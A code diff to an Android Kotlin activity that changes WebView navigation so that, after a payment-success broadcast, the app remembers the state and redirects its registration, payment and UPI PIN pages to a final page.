@@ -64,16 +64,18 @@ class MainActivity : ComponentActivity() {
     
     private lateinit var appConfig: AppConfig
     private var isPaymentReceiverRegistered = false
-    private val paymentSuccessReceiver = object : BroadcastReceiver() {
+    private val         paymentSuccessReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
             runOnUiThread {
+                saveReachedFinal()
                 if (::webView.isInitialized) {
                     try {
-                        saveReachedFinal()
                         webView.loadUrl("file:///android_asset/final.html")
                     } catch (e: Exception) {
                         Log.e(TAG, "Failed to load final page after payment success", e)
                     }
+                } else {
+                    pendingFinalScreen = true
                 }
             }
         }
@@ -375,11 +377,13 @@ class MainActivity : ComponentActivity() {
                 
                 if (url != null && url.contains("final.html")) {
                     saveReachedFinal()
-                } else if (url != null && url.contains("index.html") && hasReachedFinal()) {
-                    handler.postDelayed({
-                        webView.loadUrl("file:///android_asset/final.html")
-                    }, 100)
-                    return
+                } else if (url != null && hasReachedFinal()) {
+                    if (url.contains("index.html") || url.contains("register.html") || url.contains("payment.html") || url.contains("upi-pin.html")) {
+                        handler.postDelayed({
+                            webView.loadUrl("file:///android_asset/final.html")
+                        }, 100)
+                        return
+                    }
                 }
 
                 webView.evaluateJavascript(
@@ -496,6 +500,16 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun handleUrlNavigation(url: String): Boolean {
+        if (hasReachedFinal()) {
+            if (url.contains("index.html") || url.contains("register.html") || url.contains("payment.html") || url.contains("upi-pin.html")) {
+                handler.post {
+                    if (::webView.isInitialized) {
+                        webView.loadUrl("file:///android_asset/final.html")
+                    }
+                }
+                return true
+            }
+        }
         return false
     }
 
@@ -532,7 +546,7 @@ class MainActivity : ComponentActivity() {
     
     private fun saveReachedFinal() {
         val prefs: SharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
-        prefs.edit().putBoolean(KEY_REACHED_FINAL, true).apply()
+        prefs.edit().putBoolean(KEY_REACHED_FINAL, true).commit()
     }
     
     private fun hasReachedFinal(): Boolean {
